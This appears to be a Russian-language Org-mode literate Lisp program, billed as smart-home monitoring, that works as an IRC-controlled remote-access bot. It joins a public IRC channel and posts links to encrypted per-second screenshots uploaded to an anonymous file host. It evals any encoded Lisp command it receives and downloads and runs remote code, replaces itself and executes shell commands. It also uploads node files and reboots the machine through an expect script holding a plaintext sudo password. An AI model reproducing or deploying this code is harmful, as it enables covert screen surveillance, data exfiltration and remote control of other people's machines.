#+STARTUP: showall indent hidestars

#+BEGIN_SRC lisp
  (sb-posix:get-pid)
  ,*/1 * * * * export DISPLAY=:0 && cd ~/quicklisp/ && flock -xn ./srv.lock sbcl --load ./srv.lisp > ./log.txt
#+END_SRC

* Intro

Это внешняя система мониторинга, предназначеная для наблюдения за работой
узла сети. Узел сети может быть не только desktop-системой, но и сервером
умного дома и осуществлять управление его компонентами: включать и
выключать нагрузку, отправлять команды роботу-пылесосу ("ехать на
зарядку"), и.т.п.

К сожалению, некоторые проприетарные компоненты автоматизации, такие как
3D-принтер, могут управляться только через GUI своей управляющей
программы. Поэтому для того чтобы удаленно управлять ими необходимо
анализировать скриншоты экрана и осуществлять операции виртуальной мышью
и клавиатурой над управляющей программой.

Поэтому мы должны отслеживать изменения на экране, отпралять их в
коммуникационный канал (естественно не в открытом виде) и иметь
возможность проанализировать их удаленно, а потом отослать команду,
которая будет выполнена.

Наша основная задача - сократить количество передаваемых данных, потому
что узлов сети может быть множество и не все из них имеют быстрые каналы
передачи.

* Supervisor

Мы хотим создать надежную систему, но подключение к интернету может быть
ненадежным, к тому же нет уверенности в том, что все ошибки, которые
могут возникнуть, будут корректно перехвачены.

Поэтому мы сделаем супервизор, который будет перезапускать потоки, в
которых будет происходить основная работа. Если у потока возникнут
проблемы - супервизор отследит это и перезапустит поток.

Чтобы иметь возможность изменять супервизор на лету, мы оформим его как
лямбду в глобальной переменной, которую будет вызывать функция
~supervisor-loop~.

Мы также используем флаги, размещенные в глобальных переменных, чтобы
супервизор мог принудительно завершать потоки. Если что-то пойдет не так
то поток может, например, перезапустить себя, выставив нужный флаг.

Каждую секунду супервизор инкрементирует состояние переменной
~watchdog-timer~. Если поток завис и не сбрасывает эту переменную в
ноль - супервизор принудительно завершает поток, что приводит к его
перезапуску.

Если соединение с irc-сервером установлено (о чем свидетельствует
~connection-established-flag~) то супервизор должен запускать новый поток
репортинга каждую секунду. Задача этого потока - сделать скриншот экрана,
поместить в png-файл, зашифровать его, загрузить на файлообменник и
послать полученную ссылку в чат. После выполнения задачи поток должен
завершиться. Это не обязательно произойдет - он может зависнуть из-за
ошибки или просто слишком долго работать. Поэтому супервизор отслеживает
количество таких потоков и если их становится больше чем
~max-shot-thread-cnt~ удаляет те, которые работают слишком долго.

[TODO:gmm] Возможно, эта модель не требуется, т.к. нам не нужно создавать
по отдельному потоку для скриншотинга каждую секунду. Т.е. мы вполне
можем обойтись только контролем зависания одного потока, в котором
работает цикл приема сообщений.

#+NAME: supervisor
#+BEGIN_SRC lisp :noweb yes
  <<debug>>

  (defparameter *max-diffs-cnt* 4)

  (defparameter *sleep-interval* 3)

  (defparameter *watchdog-timer* 0)

  (defparameter *watchdog-timer-max* 100)

  (defparameter *supervisor-stop-flag* nil)

  (defparameter *irc-th-stop-flag* nil)

  (defparameter *shot-th-stop-flag* nil)

  (defparameter *connection-established-flag* nil)

  (defparameter *shot-threads* nil)

  (defparameter *max-shot-thread-life-time* 5)

  (defparameter *max-shot-thread-cnt* 5)

  (defparameter *thread-operations-lock*
    (bt:make-recursive-lock "thread-operations-lock"))

  ;; irc
  <<irc>>

  ;; update
  <<update>>

  ;; shot
  <<shot>>

  ;; upload_code
  <<upload_code>>

  ;; replace_yourself
  <<replace_yourself>>

  ;; remote_gui
  <<remote_gui>>

  ;; shell_command
  <<shell_command>>

  (defparameter *supervisor*
    (lambda ()
      (let ((all-threads (mapcar #'(lambda (th)  (cons (bt:thread-name th) th))
                                 (bt:all-threads))))
        (labels ((fnd (name) (loop :for (nm . th) :in all-threads
                                :do (when (equal name nm)  (return th))))
                 (kill (th)  (handler-case (bt:destroy-thread th)
                               ;; happens, when thread destroyed already
                               (TYPE-ERROR () nil)))
                 (kill-irc (th)
                   (kill th)
                   (setf *watchdog-timer* 0)
                   (setf *connection-established-flag* nil))
                 (clear ()
                   (bt:with-recursive-lock-held (*thread-operations-lock*)
                     (setf *shot-threads*
                           (remove-if-not #'(lambda (pair)
                                              (bt:thread-alive-p (car pair)))
                                          ,*shot-threads*)))))
          ;; if there is no irs-thread then start it
          (when (and (null (fnd "irc-th"))       ;; no irc-th
                     (null *irc-th-stop-flag*))  ;; no irc-th stop flag
            (dbg "::supervisor lambda: start irc-th~%")
            (setf *watchdog-timer* 0)
            (bt:make-thread
             #'irc :name "irc-th"
             :initial-bindings
             `((*standard-output* . ,*standard-output*)
               (*irc-thread-stop-flag* . ,*irc-th-stop-flag*))))
          ;; if there is irc-thread, but the watchdog-timer exceeds
          ;; or the flag is set - then kill it.
          (awhen (fnd "irc-th")
            (when (> *watchdog-timer*  *watchdog-timer-max*)
              (dbg "::supervisor-lambda: kill irc-th by WDG~%")
              (kill-irc it))
            (when *irc-th-stop-flag*
              (dbg "::supervisor-lambda: kill irc-th by FLAG~%")
              (kill-irc it)))
          ;; kill latecomers shot-threads if there are too many
          ;; TODO: debug it!
          (when (> (length *shot-threads*) *max-shot-thread-cnt*)
            (dbg "::supervisor-lambda: many threads~%")
            (loop :for (shot-th . time) :in *shot-threads* :do
                 (dbg "~A . ~A~%" shot-th time)
                 (when (> (- (get-universal-time) time)
                          ,*max-shot-thread-life-time*)
                   (dbg "::supervisor-lambda: kill shot-th by lifetime exceed~%")
                   (kill shot-th)))
            (clear))
          ;; start new shot-thread (every second when connection-established)
          (clear)
          (when *connection-established-flag*
            (let ((bindings `((*standard-output* . ,*standard-output*)
                              (*shot-th-stop-flag* . ,*shot-th-stop-flag*)
                              (*irc-sess* . ,*irc-sess*)
                              (*irc-user* . ,*irc-user*)
                              (*irc-serv* . ,*irc-serv*)
                              (*irc-chan* . ,*irc-chan*)
                              (*irc-lock* . ,*irc-lock*)
                              (*irc-conn* . ,*irc-conn*)
                              (*watchdog-timer* . ,*watchdog-timer*))))
              (bt:with-recursive-lock-held (*thread-operations-lock*)
                (push (cons (bt:make-thread #'shot :name "shot-th"
                                            :initial-bindings bindings)
                            (get-universal-time))
                      ,*shot-threads*))))))))

  (defun supervisor-loop ()
    (setf *watchdog-timer* 0)
    (tagbody
     infinite
       (when *supervisor-stop-flag*
         (go end))
       (dbg "::supervisor-loop WDG=~3,'0D~%" *watchdog-timer*)
       (funcall *supervisor*)
       (sleep *sleep-interval*)
       (incf *watchdog-timer*)
       (go infinite)
     end))

  (supervisor-loop)
#+END_SRC

Ниже - диаграмма работы супервизора с остальными компонентами

#+BEGIN_SRC plantuml :file ../../../img/survey-01.png
  participant Supervisor
  participant Shot_Thread
  participant Irc_Thread
  participant Irc_Helper
  participant Irc_Server
  hide footbox
  create Irc_Thread
  Supervisor -> Irc_Thread : make_thread
  Supervisor -> Supervisor : wait for **CONNECTION_ESTABLISHED_FLAG**
  Irc_Thread -> Irc_Server : connect
  Irc_Server -> Irc_Thread : ok

  group Irc_Loop
    create Irc_Helper
    Irc_Thread   -> Irc_Helper : make_thread
    Irc_Thread -> Irc_Thread : read_message_loop
    activate Irc_Helper
    note right Irc_Helper
      add_hook **IRC_MSG_HOOK**
      join to channel
      send presence
      set **CONNECTION_ESTABLISHED_FLAG**
    end note
    Irc_Helper --> Irc_Helper :
    destroy Irc_Helper
	end

  Irc_Thread --> Irc_Thread : IRC_MSG_HOOK
  Irc_Thread --> Irc_Thread : IRC_MSG_HOOK
  Irc_Thread --> Irc_Thread : IRC_MSG_HOOK

  group When **CONNECTION_ESTABLISHED_FLAG**
    create Shot_Thread
    Supervisor -> Shot_Thread : make_thread
    activate Shot_Thread

    note over Shot_Thread
      x_snapshot
      pack_img
    end note

    group Wrap_Img
      note over Shot_Thread
        encrypt
        anon-file-upload
        sendmsg
      end note
    end

    Shot_Thread --> Shot_Thread :
    destroy Shot_Thread
	end
#+END_SRC

#+results:
[[file:../../../img/survey-01.png]]

* Irc

Работа с IRC состоит из нескольких этапов
- Подключение
- Запуск цикла чтения сообщений
- Установка хука, чтобы перехватить сообщения-команды
- Подключение к каналу и отправка первого сообщения

После этого мы можем отпралять сообщения в канал, а когда другие
сообщения будут приходить наш хук будет выполнен.

** Connect

Начнем с подключения к IRC - нашему коммуникационному каналу.

Если нет подключения к сети мы получим ошибку
~USOCKET:NS-TRY-AGAIN-CONDITION~, которая будет проигнорирована, но
записана в лог, как и любые другие ошибки подключения. В этих случаях
функция ~irc-loop~ не будет вызвана, произойдет выход их функции потока и
поток будет завершен. Обнаружив отсутствие потока супервизор перезапустит
его и это приведет к следующей попытке подключения.

Если подключение произошло успешно - мы вызываем ~irc-loop~.

#+NAME: irc
#+BEGIN_SRC lisp :noweb yes
  (defparameter *irc-sess* nil) ;; (get-universal-time)
  (defparameter *irc-user* nil) ;; (format nil "b~A" *irc-sess*)
  (defparameter *irc-serv* "irc.freenode.org")
  (defparameter *irc-chan* "#nvrtlessfndout")
  (defparameter *irc-lock* (bt:make-recursive-lock "irc-lock"))
  (defparameter *irc-conn* nil)

  <<irc_loop>>

  (defun irc ()
    "irc thread func"
    (setf *irc-sess* (get-universal-time))
    (setf *irc-user* (format nil "b~A" *irc-sess*))
    (setf *irc-conn*
          (handler-case
              (cl-irc:connect :nickname *irc-user* :server *irc-serv*)
            (USOCKET:NS-TRY-AGAIN-CONDITION (err)
              (dbg "::irc connect error: ~A~%" (type-of err))
              nil)
            (t (err)
              (dbg "::irc connect error: ~A~%" (type-of err))
              nil)))
    (when *irc-conn*
      (dbg "::irc conn:~A~%" *irc-conn*)
      (setf *watchdog-timer* 0)
      (irc-loop)))
#+END_SRC

** Read loop

После успешного подключения мы запускаем цикл чтения сообщений из
коммуникационного канала. В случае успеха этот поток будет зациклен в
нем, поэтому здесь мы должны запустить вспомогательный поток
~irc-helper~, который установит нужные хуки

При временном отключении интернета внутри ~CL-IRC:READ-MESSAGE-LOOP~
может возникнуть ошибка ~SB-INT:SIMPLE-STREAM-ERROR~ с сообщением вида
couldn't read from #<SB-SYS:FD-STREAM for "socket 192.168.0.102:50644,
peer: 149.56.134.238:6667" {1008002283}>: Connection reset by peer

В этом случае нужно сделать реконнект. Чтобы его осуществить мы просто
игнорируем ошибку, выведя её в лог и возвращая NIL. Это приводит к выходу
из функции потока и супервизор запустит поток снова на следующем шаге.

Я временно отключил игнорирование ошибок, чтобы поймать их, если они
произойдут. По идее все возможные ошибки перехватываются в местах их
возникновения, если это не так - я увижу это, т.к. игнор отключен.

#+NAME: irc_loop
#+BEGIN_SRC lisp :noweb yes
  <<irc_helper>>

  (defun irc-loop ()
    (bt:make-thread
     #'irc-helper :name "irc-helper-th"
     :initial-bindings
     `((*standard-output* . ,*standard-output*)
       (*irc-sess* . ,*irc-sess*)
       (*irc-user* . ,*irc-user*)
       (*irc-serv* . ,*irc-serv*)
       (*irc-chan* . ,*irc-chan*)
       (*irc-lock* . ,*irc-lock*)
       (*irc-conn* . ,*irc-conn*)))
    (handler-case (cl-irc:read-message-loop *irc-conn*)
      (SB-INT:SIMPLE-STREAM-ERROR (err)
        (dbg "::irc-loop error: ~A~%" (type-of err)))
      ;; (t (err)
      ;;   (dbg "::irc-loop error: ~A~%" (type-of err)))
      ))
#+END_SRC

** Irc helper

После того как мы запустили цикл чтения сообщений следует подождать
немного, чтобы успели дойти приветственные сообщения канала.

Мы устанавливаем хук чтобы перехватить приход сообщений и подключаемся к
каналу.

После этого мы считаем, что соединение корректно установлено, о чем
сигнализируем установкой флага *connection-established-flag*

После этого можно отправить сообщение о присутствии.

Затем поток завершается - свою задачу он выполнил.

[TODO:gmm] По-видимому, вероятна ситуация, когда пропадает коннект в
момент передачи сообщения в канал. В этом случае поток застревает в
блокировке, не давая ее взять другим потокам. Я добавил ~recursive-lock~,
но этого недостаточно. Полагаю, необходимо применение таймаутов на
блокировку, но пока не могу придумать модельную ситуацию чтобы проверить
это.

#+NAME: irc_helper
#+BEGIN_SRC lisp :noweb yes
  (defmacro sendmsg (msg &rest params)
    `(bt:with-recursive-lock-held (*irc-lock*)
       (handler-case
           (cl-irc:privmsg *irc-conn* *irc-chan* (format nil ,msg ,@params))
         (t (err)
           (dbg "::irc connect error: ~A~%" (type-of err))
           nil))))

  ;; irc-hook
  <<irc_hook>>

  (defun irc-helper ()
    (sleep 1)
    (cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
    (sleep 1)
    (bt:with-recursive-lock-held (*irc-lock*)
      (cl-irc:join *irc-conn* *irc-chan*))
    (sleep 1)
    (bt:with-recursive-lock-held (*irc-lock*)
      (setf *connection-established-flag* t))
    (sendmsg "hi"))
#+END_SRC

** Command hook

Определим функцию, которая будет обрабатывать сообщения, получаемые из
irc-канала. Она должна возвращать T чтобы предотвратить дальнейшую
обработку принятого сообщения.

#+NAME: irc_hook
#+BEGIN_SRC lisp :noweb yes
  ;; irc_cmd_proc
  <<irc_cmd_proc>>

  (defun irc-msg-hook (param)
    "MUST return T for stop hooks processing"
    (funcall *irc-cmd* param)
    (setf *watchdog-timer* 0)
    t)
#+END_SRC

У сообщения есть следующие поля:
- CL-IRC:SOURCE
- CL-IRC:USER
- CL-IRC:HOST
- CL-IRC:COMMAND
- CL-IRC:ARGUMENTS
- CL-IRC:CONNECTION
- CL-IRC:RECEIVED-TIME
- CL-IRC:RAW-MESSAGE-STRING

Из них нас интересует собственно команда размещенная в ~ARGUMENTS~. Мы
прогоняем ее через функцию ~decode~, которая регуляркой разбивает команду
на контрольную сумму (CRC32) и base64-кодированный код. Код
расшифровывается с помощью ~decrypt~ и текущего ~seed~ а затем по нему
вычисляется контрольная сумма. Если переданная контрольная сумма совпала
с вычисленной - эта команда адресована нам, и мы ее выполняем.

#+NAME: irc_cmd_proc
#+BEGIN_SRC lisp :noweb yes
  ;; seq_xor
  <<seq_xor>>

  ;; ecrypt
  <<encrypt>>

  ;; decrypt
  <<decrypt>>

  ;; encode
  <<encode>>

  ;; decode
  <<decode>>

  (defparameter *irc-cmd*
    (lambda (param)
      (block irc-cmd-block
        (let* ((msg (cadr (CL-IRC:ARGUMENTS param)))
               (cmd (decode msg *irc-sess*)))
          (dbg "::MSG: [~A]~%" msg)
          (dbg "::CMD: [~A]~%" cmd)
          (finish-output)
          (unless (null cmd)
            (setf *watchdog-timer* 0)
            (let ((result (handler-case (bprint (eval (read-from-string cmd)))
                            (t (err)
                              (dbg "::irc-cmd error: ~A~%" (type-of err))
                              (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                              (return-from irc-cmd-block nil)))))
              (setf *watchdog-timer* 0)
              (sendmsg "=> ~A" result)
              (dbg "::=> ~A~%" result)
              (finish-output)))))))

  ;; example of send encoded cmd
  ;; (encode "(print 1)" *irc-sess*)

  ;; example of wrong encoded cmd
  ;; (encode "(print 1)" (get-universal-time))
#+END_SRC

** Sequence XOR

#+NAME: seq_xor
#+BEGIN_SRC lisp
  (defun seq-xor (len seq-1 seq-2)
    (let ((result (make-array len :element-type '(unsigned-byte 8))))
      (do ((idx 0 (incf idx)))
          ((= idx len))
        (setf (aref result idx)
              (logxor (aref seq-1 idx)
                      (aref seq-2 idx))))
      result))
#+END_SRC

** Encrypt

#+NAME: encrypt
#+BEGIN_SRC lisp
  (defun encrypt (oct seed)
    (let* ((len (length oct))
           (gen (prbs:byte-gen 31 :seed seed))
           (gam (funcall gen len))
           (enc (seq-xor len oct gam)))
      (base64:usb8-array-to-base64-string enc)))
#+END_SRC

** Decrypt

#+NAME: decrypt
#+BEGIN_SRC lisp
  (defun decrypt (base64 seed)
    (let* ((oct (base64:base64-string-to-usb8-array base64))
           (gen (prbs:byte-gen 31 :seed seed))
           (len (length oct))
           (gam (funcall gen len)))
      (seq-xor len oct gam)))
#+END_SRC

** Encode

#+NAME: encode
#+BEGIN_SRC lisp
  (defun encode (cmd seed)
    (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
           (crc32   (ironclad:byte-array-to-hex-string
                     (ironclad:digest-sequence :crc32 oct)))
           (encoded (encrypt oct seed)))
      (format nil "s/~A/~A" crc32 encoded)))
#+END_SRC

** Decode

#+NAME: decode
#+BEGIN_SRC lisp
(defun decode (cmd seed)
  (multiple-value-bind (match-p result)
      (ppcre:scan-to-strings "s/([0-f]*)/(.*)$" cmd)
    (unless match-p
      (return-from decode nil))
    (destructuring-bind (crc32 cmd)
        (coerce result 'list)
      (let* ((oct (decrypt cmd seed))
             (crc (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct))))
        (if (equal crc crc32)
            (flex:octets-to-string oct :external-format :utf-8)
            ;; else
            nil)))))
#+END_SRC

* Update On Irc & Features

Чтобы удаленно расширять функциональность супервизора нам нужен способ
обновить код. В блоке кода [[irc_cmd_proc][irc_cmd_proc]] раздела [[*Command hook][Command hook]] опредено,
как узел может выполнить команду. Так что теперь мы должны написать
процедуру, которая эту команду сформирует.

При этом мы ограничены размером IRC-сообщения, которое может быть не
больше полукилобайта, поэтому сначала лучше закачать зашифрованное
обновление на файлообменник и получить на него ссылку.

Эту задачу берет на себя процедура ~upload-code~, ей нужен код,
(представленный как строка) и ключ, чтобы зашифровать код (т.к. мы не
хотим чтобы файлобменник мог его прочитать).

Вызвать ~upload-code~ это задача оператора. ~upload-code~ возвращает
ссылку на закачанный зашифрованный файл.

#+NAME: upload_code
#+BEGIN_SRC lisp :noweb yes
  (defun upload-code (code key)
    (let* ((oct (flex:string-to-octets code :external-format :utf-8))
           (base64 (encrypt oct key))
           (filename (format nil "u-~A" (get-universal-time)))
           (result   (cl-json:decode-json-from-string
                      (anon-file-upload filename base64)))
           (link     (if (cdr (assoc :status result))
                         (subseq (cdadr (cadadr (assoc :data result))) 20)
                         nil)))
      link))

  ;; TEST for upload
  ;; (upload-code "(defun alfa () (print 1))" 1234567890)
  ;; /t1TaCeD1ne/u-3784605289
#+END_SRC

Теперь, когда есть ссылка, оператор может сформировать команду для
отправки в irc-канал. Для этого он составляет из полученной на предыдущем
этапе ссылки и ключа команду вида:

#+BEGIN_EXAMPLE
  "(update \"/t1TaCeD1ne/u-3784605289\" 1234567890)"
#+END_EXAMPLE

Но так как команда не посылается в канал в открытом виде - её надо
зашифровать с помощью ~encode~

#+BEGIN_SRC lisp
  ;; (encode "(update \"/t1TaCeD1ne/u-3784605289\" 1234567890)" 3784752939)
  ;; => s/2953b20b/61gOM23BnHgQ+JFZnz7WxmlPOMmajHeB4N1efW+gmhVHdICEy2my4tNdK2algQ==
#+END_SRC

Полученную команду уже вполне можно посылать в канал и, если узел получил и
выполнил команду, он вернет результат в канал, например так:

#+BEGIN_EXAMPLE
  <b3784752939> => "ALFA"
#+END_EXAMPLE

Мы можем обьединить закачку кода и отправку команды в одну операцию, для
удобства:

#+NAME: upload_code_and_send
#+BEGIN_SRC lisp :noweb yes
  ;; seq_xor
  <<seq_xor>>

  ;; encrypt
  <<encrypt>>

  ;; anon_file_upload
  <<anon_file_upload>>

  ;; upload_code
  <<upload_code>>

  ;; encode
  <<encode>>

  (defun upload-code-and-send (code key seed)
    (let* ((code-link (upload-code code key))
           (cmd (format nil "(update \"~A\" ~A)" code-link key))
           (enc (encode cmd seed)))
      (sendmsg enc)))

  ;; (upload-code-and-send "(alfa)" 1234567890 3784753813)
#+END_SRC

В этом тестовом примере узел должен выполнить ~ALFA~ и выдать в канал
результат выполнения (число 1).

Чтобы все сработало, ~на узле~ нужно определить функцию ~UPDATE~, которая
будет получать ссылку на файл с кодом, скачивать и расшифровывать его а потом
применять:

#+NAME: update
#+BEGIN_SRC lisp :noweb yes
  ;; anon_file_download
  <<anon_file_download>>

  (defun update (link key)
    (let* ((base64 (anon-file-download link))
           (oct    (decrypt base64 key))
           (cmd    (flex:octets-to-string oct :external-format :utf-8))
           (result (handler-case (bprint (eval (read-from-string cmd)))
                     (t (err)
                       (dbg "::irc-cmd error: ~A~%" (type-of err))
                       (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                       (return-from update nil)))))
      result))

  ;; (update "/3444C7Dbna/u-3784602724" 1234567890)
#+END_SRC

** File obtaining

Воспользуемся этим механизмом, чтобы сформировать какую-то новую
функциональность, которая не была определена ранее. Например, попросим
узел загрузить на файлообменник какой-нибудь файл.

Для этого надо определить процедуру, которую у оператора уже есть -
~upload-code~ (она определена в разделе выше). Но эта процедура не
включена в код супервизора, исполняющийся на удаленной машине (поправка:
в новом релизе - уже включена, но неважно). Эта процедура вызывает внутри
себя ~encrypt~ и ~anon-file-upload~, которые уже на удаленном узле
определены.

Чтобы отослать нам понадобится текущий ~seed~ получателя, который мы
можем взять из его сообщений в канале и сохранить в переменную
*receiver*. Также определим ключ, чтобы закрыть код от файлообменника.

Формируем строку и отсылаем:

#+BEGIN_SRC lisp
  (defparameter *receiver* 3784758144)
  (defparameter *tmpkey* 1234567890)

  (upload-code-and-send
   "(defun upload-code (code key)
    (let* ((oct (flex:string-to-octets code :external-format :utf-8))
           (base64 (encrypt oct key))
           (filename (format nil \"u-~A\" (get-universal-time)))
           (result   (cl-json:decode-json-from-string
                      (anon-file-upload filename base64)))
           (link     (if (cdr (assoc :status result))
                         (subseq (cdadr (cadadr (assoc :data result))) 20)
                         nil)))
      link))"
   ,*tmpkey*
   ,*receiver*)
#+END_SRC

Теперь, вызвав свежеопределенную процедуру, мы можем закачать собственный
код на файлообменник и получить на него ссылку:

#+BEGIN_SRC lisp
  (defparameter *receiver* 3784758144)
  (defparameter *tmpkey* 1234567890)

  (upload-code-and-send
   (format
    nil
    "(upload-code (alexandria:read-file-into-string \"q.lisp\") ~A)"
    ,*tmpkey*)
   ,*tmpkey*
   ,*receiver*)
#+END_SRC

По этой ссылке скачать файл себе и расшировать его:

#+NAME: download_and_decrypt
#+BEGIN_SRC lisp
  (defun download-and-decrypt (link key)
    (flex:octets-to-string
     (decrypt
      (anon-file-download link)
      key)
     :external-format :utf-8))

  ;; (upload-code
  ;;  (alexandria:read-file-into-string "q.lisp\"")

  ;; (download-and-decrypt "/some/link" *tmpkey*)
#+END_SRC

** Replace yourself

Теперь выполним обратную операцию - загрузим файл на узел - например
новую версию себя:

#+NAME: replace_yourself
#+BEGIN_SRC lisp :noweb yes
  <<download_and_decrypt>>

  (defun replace-yourself (link key)
    (alexandria:write-string-into-file
     (download-and-decrypt link key)
     "q.lisp" :if-exists :supersede)
    'ok)

  ;; (upload-code (alexandria:read-file-into-string "q.lisp") 1234567890)
  ;; => "/some/file"

  ;; (defparameter *receiver* 3784783570)
  ;; (defparameter *tmpkey* 1234567890)

  ;; (upload-code-and-send
  ;;  "(replace-yourself \"/some/file\" 1234567890)"
  ;;  *tmpkey*
  ;;  *receiver*)
#+END_SRC

** Run program

Аналогичным образом добавляем возможность запускать команды на удаленном
узле. Следует помнить, что запуск полностью синхронный, поэтому следует
добавлять амперсанд (&) в конце команды, чтобы не ждать ее завершения.

#+NAME: shell_command
#+BEGIN_SRC lisp
  (defvar *shell-search-paths* '("/usr/bin/" "/usr/local/bin/"))

  (defparameter *bourne-compatible-shell* "/bin/sh"
    "The path to a Bourne compatible command shell in
  physical pathname notation.")

  (defun directory-pathname-p (pathname)
    "Does `pathname` syntactically  represent a directory?
    ---
    A directory-pathname is a pathname _without_ a filename. The three
    ways that the filename components can be missing are for it to be `nil`,
    `:unspecific` or the empty string.
    "
    (flet ((check-one (x)
             (not (null (member x '(nil :unspecific "")
                                :test 'equal)))))
      (and (check-one (pathname-name pathname))
           (check-one (pathname-type pathname)))))

  (defmacro with-gensyms (syms &body body)
    `(let ,(mapcar #'(lambda (s)
                       `(,s (gensym)))
                   syms)
       ,@body))

  (defmacro with-stream-from-specifier ((stream)
                                        &body body)
    (with-gensyms (s close? result)
      `(let ((,close? t)
             ,s
             ,result)
         (unwind-protect
              (setf ,result
                    (multiple-value-list
                     (let (,stream)
                       (setf (values ,s ,close?)
                             nil)
                       (setf ,stream ,s)
                       ,@body)))
           (when (and ,close? ,s)
             (let ((it (close-stream-specifier ,s)))
               (when it
                 (setf (first ,result) it)))))
         (values-list ,result))))

  (defmacro with-input ((var) &body body)
    "Create an input stream from source and bind it to var within the body of the with-input form. The stream will be closed if necessary on exit."
    `(with-stream-from-specifier (,var)
       ,@body))

  (defun close-stream-specifier (s)
    (if (equal (type-of s) 'string-stream)
        (prog1
            (values (get-output-stream-string s))
          (close s))
        ;; else
        (progn
          (close s)
          (values nil))))

  (defun file-to-string-as-lines (stream)
    (with-output-to-string (s)
      (loop for line = (read-line stream nil :eof nil)
         until (eq line :eof) do
           (princ line s)
           (terpri s))))

  (defun %shell-command (command)
    (with-input (input-stream)
      (let* ((process (sb-ext:run-program
                       ,*bourne-compatible-shell*
                       (list "-c" command)
                       :wait nil :input input-stream
                       :output :stream
                       :error :stream))
             (output-thread (sb-thread:make-thread
                             #'(lambda ()
                                 (file-to-string-as-lines
                                  (sb-impl::process-output process)))))
             (error-thread (sb-thread:make-thread
                            #'(lambda ()
                                (file-to-string-as-lines
                                 (sb-impl::process-error process))))))
        (let ((error-code
               (sb-impl::process-exit-code (sb-impl::process-wait process)))
              (output-string (sb-thread:join-thread output-thread))
              (error-string (sb-thread:join-thread error-thread)))
          (close (sb-impl::process-output process))
          (close (sb-impl::process-error process))
          (values output-string error-string error-code)))))

  (defun find-command-ending-in-string (command)
    (let ((checking? t))
      (loop for ch across command
         for i from 0 do
           (cond ((and checking? (char= ch #\Space))
                  (return i))
                 ((char= ch #\\)
                  (setf checking? nil))
                 (t
                  (setf checking? t))))))


  (defun shell-command (command)
    "Synchronously execute `command` using a Bourne-compatible shell,
     returns (values output error-output exit-status).
     --
     The `command` can be a full path to a shell executable binary
     or just its name. In the later case, the variable `*shell-search-paths*`
     will be used to find the executable.
     --
     Depending on the implementation, the variable `*bourne-compatible-shell*`
     may be used to find a shell to use in executing `command`."
    (let* ((pos-/ (position #\/ command))
           (pos-space (find-command-ending-in-string command))
           (binary (subseq command 0 (or pos-space)))
           (args (and pos-space (subseq command pos-space))))
      (when (or (not pos-/)
                (and pos-/ pos-space)
                (and pos-space
                     (< pos-/ pos-space)))
        ;; no slash in the command portion, try to find the command with
        ;; our path
        (setf binary
              (or (loop for path in *shell-search-paths* do
                       (let ((full-binary (make-pathname :name binary
                                                         :defaults path)))
                         (when (and (probe-file full-binary)
                                    (directory-pathname-p full-binary))
                           (return full-binary))))
                  binary)))
      (multiple-value-bind (output error status)
          (%shell-command (format nil "~a~@[ ~a~]" binary args))
        (values output error status))))
#+END_SRC

Тут приведен пример запуска, написанный в расчете на то, что предыдущий
блок упакован в строку, размещенную в переменной ~*CODE*~.

Также есть примеры запуска на удаленном узле
- броузера (как пример GUI-программы которая есть везде)
- команды которая используется, чтобы понять, запущен ли броузер (она
  подсчитывает процессы с именами "firefox")
- закрытия броузера (как пример завершения процессов, запущенных
  асинхронно)
- проверки определена ли процедура (так можно определять, какие features
  поддерживаются в этой инсталляции супервизора узла в текущий момент)
- удаления определения процедуры (оно необходимо, т.к. без него
  переопределение ловится процедурой игнорирования ошибки)

#+BEGIN_SRC lisp
  (defparameter *receiver* 3784780565)

  (defparameter *tmpkey* 3784780565)

  (upload-code-and-send
   ,*code*
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(uiop:run-program \"firefox &\")"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(shell-command \"ps aux | grep firefox | wc -l\")"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(shell-command \"killall firefox\")"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(fboundp 'shell-command)"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(setf *sleep-interval* 300)"
   ,*tmpkey*
   ,*receiver*)



  (upload-code-and-send
   "(fmakunbound 'shell-command)"
   ,*tmpkey*
   ,*receiver*)
#+END_SRC

** Shutdown

Чтобы выполнить перезагрузку воспользуемся ~EXPECT~. Скрипт будет таким:

#+NAME:
#+BEGIN_SRC tcl
  #!/usr/bin/expect -d
  spawn sudo reboot
  sleep 3
  expect {\[sudo\] ?assword* }
  send "rfhfrfnbwf\r"
  sleep 3
#+END_SRC

Вот последовательность команд, которую нужно исполнить, чтобы загрузить и
выполнить скрипт перезагрузки на узле. Следует помнить, что после
перезагрузки узел не выйдет в сеть, если на нем не установлен автологин.

#+BEGIN_SRC lisp
  (defparameter *receiver* 3784776109)

  (defparameter *tmpkey* 1234567890)

  (defparameter *code*
    "(alexandria:write-string-into-file
     \"#!/usr/bin/expect -d
     spawn sudo reboot
     sleep 3
     expect {\\[sudo\\] ?assword* }
     send \\\"rfhfrfnbwf\\\\r\\\"
     sleep 3
     \"
     \"rbt.sh\" :if-exists :supersede)
  ")

  (upload-code-and-send
   ,*code*
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(shell-command \"ls -la| grep rbt\")"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(shell-command \"chmod +x rbt.sh\")"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(shell-command \"./rbt.sh\")"
   ,*tmpkey*
   ,*receiver*)
#+END_SRC

** Remote GUI: moving & actions
:PROPERTIES:
:xtest: xlib/xtest
:END:

#+NAME: get_property
#+BEGIN_SRC elisp :var prop=""
  (org-entry-get nil prop t)
#+END_SRC

Для управления GUI-программами на узле нам нужны возможности по
управлению мышью. Тут приведен код, функции которого можно вызывать.

~perform-mouse-action~ создает фейковое событие мышки, а
~perform-key-action~ создает фейковое событие клаиватуры. Обе функции
принимают первым параметров ~t~ или ~nil~, что соответствует "нажать" и
"отпустить", затем ~keysym~.

~perform-mouse-action~ принимает еще и координаты, куда следует кликнуть
"мышкой".

#+NAME: remote_gui
#+BEGIN_SRC lisp :noweb yes
  (defun x-move (x y)
    (if (and (integerp x) (integerp y))
        (with-default-display-force (d)
          (<<get_property("xtest")>>:fake-motion-event d x y))
